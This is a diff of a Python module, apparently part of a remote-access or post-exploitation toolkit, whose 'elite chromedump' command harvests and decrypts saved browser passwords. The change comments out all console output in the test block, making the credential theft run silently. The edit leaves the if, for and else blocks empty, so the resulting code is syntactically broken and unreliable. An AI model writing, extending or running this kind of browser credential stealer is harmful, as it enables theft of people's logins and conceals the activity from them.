@@ -412,19 +412,19 @@ def _decrypt_aes_password(encrypted_password: bytes, key: bytes) -> str:
 
 if __name__ == "__main__":
     # Test the elite chromedump command
-    print("Testing Elite Chromedump Command...")
+    # print("Testing Elite Chromedump Command...")
     
     result = elite_chromedump()
     
     if result['success']:
-        print(f"✅ Browser credential extraction successful!")
-        print(f"Total credentials: {result['total_credentials']}")
-        print(f"Browsers checked: {result['browsers_checked']}")
+    # print(f"✅ Browser credential extraction successful!")
+    # print(f"Total credentials: {result['total_credentials']}")
+    # print(f"Browsers checked: {result['browsers_checked']}")
         
         for cred in result['credentials'][:3]:  # Show first 3 for demo
-            print(f"  {cred['browser']}: {cred['username']}@{cred['url']}")
+    # print(f"  {cred['browser']}: {cred['username']}@{cred['url']}")
     else:
-        print(f"❌ Browser credential extraction failed: {result.get('error', 'No credentials found')}")
-        print(f"Browsers checked: {result.get('browsers_checked', [])}")
+    # print(f"❌ Browser credential extraction failed: {result.get('error', 'No credentials found')}")
+    # print(f"Browsers checked: {result.get('browsers_checked', [])}")
     
-    print("Elite Chromedump command test complete")
+    # print("Elite Chromedump command test complete")
